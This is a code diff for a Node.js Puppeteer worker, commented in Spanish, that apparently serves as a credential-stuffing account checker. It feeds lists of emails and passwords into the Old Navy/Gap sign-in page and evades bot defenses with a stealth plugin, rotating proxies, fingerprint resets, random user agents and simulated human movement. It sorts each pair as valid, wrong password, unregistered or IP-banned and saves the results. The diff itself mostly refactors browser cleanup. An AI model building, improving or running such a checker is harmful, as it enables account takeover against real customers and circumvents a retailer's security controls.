@@ -2,9 +2,12 @@ const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const userPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
 const { parentPort, workerData } = require('worker_threads');
-const fs = require('fs');
-const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
+const path = require('path');
+const fs = require('fs-extra');
+const os = require('os');
 const { execSync } = require('child_process');
+const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
+const { v4: uuidv4 } = require('uuid'); // UUID para directorios únicos
 
 puppeteer.use(StealthPlugin());
 
@@ -23,7 +26,8 @@ puppeteer.use(userPreferencesPlugin({
 
 let isPaused = false; // Variable para controlar la pausa
 let browser;
-
+let userDataDir;
+let page;
 // Función para manejar la pausa
 function checkPaused() {
     return new Promise((resolve) => {
@@ -45,15 +49,12 @@ parentPort.on('message', async (message) => {
         isPaused = false;
         parentPort.postMessage('Worker reanudado');
     } else if (message === 'stop') {
+        
+        killChromeProcesses();
+
+        await cleanUp(browser, page, userDataDir);
+
         parentPort.postMessage('Worker detenido');
-        if (browser) {
-            try {
-                await browser.close(); // Cierra el navegador
-                console.log('Navegador cerrado.');
-            } catch (error) {
-                console.error('Error al cerrar el navegador:', error);
-            }
-        }
         process.exit(0); // Finalizar el proceso del worker
     }
 });
@@ -259,16 +260,18 @@ async function createBrowserInstance(proxy) {
     }
 
     try {
+        userDataDir = path.join(os.tmpdir(), `puppeteer_tmp_${uuidv4()}`);
         await resetFingerprintCache();
         const userAgent = getUserAgent();
         const browser = await puppeteer.launch({
             headless: workerData.useHeadless,
+            userDataDir,
             args: args,
             executablePath: chromePath, 
         });
 
         const page = await browser.newPage();
-        await page.setUserAgent(userAgent);
+       await page.setUserAgent(userAgent);
 
         if (proxyAuth) {
             await page.authenticate(proxyAuth);
@@ -310,7 +313,6 @@ async function handleWorkerError(error, { useProxies, proxies, retryOnFail, i, p
     // Función auxiliar para cambiar el proxy y reintentar
     const changeProxyAndRetry = async (message) => {
         parentPort.postMessage(message);
-        await browser.close();
         if (useProxies && proxies.length > 0) {
             proxyIndex = (proxyIndex + 1) % proxies.length;
         }
@@ -389,46 +391,6 @@ async function simulateHumanClick(page, selector) {
     await page.click(selector);
 }
 
-
-async function runWorker(credentials, proxies, useProxies, retryOnFail, humanizedMode) {
-    console.log('Valores recibidos en el worker:', { useProxies, retryOnFail, humanizedMode });
-    let proxyIndex = 0;
-    const results = [];
-
-    for (let i = 0; i < credentials.length; i++) {
-        await checkPaused();
-        const { email, password } = credentials[i];
-        parentPort.postMessage(`Verificando: ${email}`);
-
-        let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
-        let { browser, page } = await createBrowserInstance(proxy);
-
-        try {
-            await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', {  waitUntil: 'networkidle2' });
-            
-            await checkPaused();
-
-            const accessDenied = await checkAccessDenied(page);
-            if (accessDenied) {
-                parentPort.postMessage('Elemento "Access Denied" detectado: IP bloqueada.');
-                throw new Error('IP bloqueada');
-            }
-            await randomUserMovement(page, 5000);
-            await loginWithEmail(page, email, humanizedMode);
-
-            const navigationResult = await determineNavigationResult(page, humanizedMode);
-            await handleLoginResult(navigationResult, page, email, password, humanizedMode, browser, results);
-        } catch (error) {
-            await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
-        }
-
-        await browser.close();
-    }
-
-    saveResults(results);
-    await checkPaused();
-    parentPort.postMessage('Worker ha finalizado todas las tareas.');
-}
 
 
 
@@ -686,7 +648,6 @@ async function determineNavigationResult(page, humanizedMode) {
 async function handleLoginResult(navigationResult, page, email, password, humanizedMode, browser, results) {
     if (navigationResult === 'banned') {
         parentPort.postMessage('IP bloqueada');
-        await browser.close();
         return;
     }
 
@@ -694,7 +655,6 @@ async function handleLoginResult(navigationResult, page, email, password, humani
     
     if (navigationResult === 'register') {
         parentPort.postMessage('El correo no está registrado.');
-        await browser.close();
         return;
     }
 
@@ -705,7 +665,6 @@ async function handleLoginResult(navigationResult, page, email, password, humani
         const passwordError = await checkPasswordError(page, humanizedMode);
         if (passwordError) {
             parentPort.postMessage('Contraseña incorrecta. Cerrando navegador.');
-            await browser.close();
             return;
         }
 
@@ -758,7 +717,7 @@ async function loginWithPassword(page, password, humanizedMode) {
        
     } else {
         parentPort.postMessage('No se encontró el botón de inicio de sesión.');
-        await browser.close();
+
         return;
     }
 
@@ -832,6 +791,104 @@ function saveResults(results) {
 }
 
 
+async function runWorker(credentials, proxies, useProxies, retryOnFail, humanizedMode) {
+    console.log('Valores recibidos en el worker:', { useProxies, retryOnFail, humanizedMode });
+    let proxyIndex = 0;
+    const results = [];
 
+    for (let i = 0; i < credentials.length; i++) {
+        await checkPaused();
+        const { email, password } = credentials[i];
+        parentPort.postMessage(`Verificando: ${email}`);
+
+        let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
+        let { browser, page } = await createBrowserInstance(proxy);
+
+        try {
+            await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', {  waitUntil: 'networkidle2' });
+            
+            await checkPaused();
+
+            const accessDenied = await checkAccessDenied(page);
+            if (accessDenied) {
+                parentPort.postMessage('Elemento "Access Denied" detectado: IP bloqueada.');
+                throw new Error('IP bloqueada');
+            }
+            await randomUserMovement(page, 5000);
+            await loginWithEmail(page, email, humanizedMode);
+
+            const navigationResult = await determineNavigationResult(page, humanizedMode);
+            await handleLoginResult(navigationResult, page, email, password, humanizedMode, browser, results);
+         } catch (error) {
+            i = await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
+        } finally {
+            await cleanUp(browser, page, userDataDir);
+        }
+
+    }
+
+    saveResults(results);
+    await checkPaused();
+    parentPort.postMessage('Worker ha finalizado todas las tareas.');
+}
+
+async function cleanUp(browser, page, userDataDir) {
+    try {
+        
+        if (page && !page.isClosed()) {
+            await withTimeout(page.close(), 5000); // Agrega manejo de tiempo de espera
+            parentPort.postMessage('Página cerrada');
+        }
+        if (browser && browser.isConnected()) {
+            await withTimeout(browser.close(), 5000, 'Cerrando navegador');
+            parentPort.postMessage('Navegador cerrado');
+        }
+        const browserProcess = browser ? browser.process() : null;
+        if (browserProcess && !browserProcess.killed) {
+            browserProcess.kill('SIGKILL');
+            parentPort.postMessage('Proceso del navegador forzado a cerrar.');
+        }
+
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        await removeDirectory(userDataDir);
+    } catch (error) {
+        parentPort.postMessage(`Error al cerrar la página o el navegador: ${error.message}`);
+    }
+}
+
+
+async function removeDirectory(userDataDir) {
+    if (fs.existsSync(userDataDir)) {
+        for (let attempt = 0; attempt < 3; attempt++) {
+            try {
+                fs.rmSync(userDataDir, { recursive: true, force: true });
+                console.log(`Directorio ${userDataDir} eliminado en el intento ${attempt + 1}.`);
+                break;
+            } catch (error) {
+                console.log(`Error al eliminar el directorio ${userDataDir} en el intento ${attempt + 1}: ${error.message}`);
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+        }
+    }
+}
+
+function killChromeProcesses() {
+    try {
+        // Ejecuta el comando para matar todos los procesos de Chrome
+        execSync('taskkill /IM chrome.exe /F /T');
+        console.log('Todos los procesos de Chrome han sido forzados a cerrar.');
+    } catch (error) {
+        console.error(`Error al forzar el cierre de Chrome: ${error.message}`);
+    }
+}
+
+
+async function withTimeout(promise, ms) {
+    const timeout = new Promise((_, reject) =>
+        setTimeout(() => reject(new Error('Operación de cierre de navegador excedió el tiempo límite')), ms)
+    );
+    return Promise.race([promise, timeout]);
+}
 
 runWorker(workerData.credentials, workerData.proxies, workerData.useProxies, workerData.retryOnFail, workerData.humanizedMode).catch(console.error);
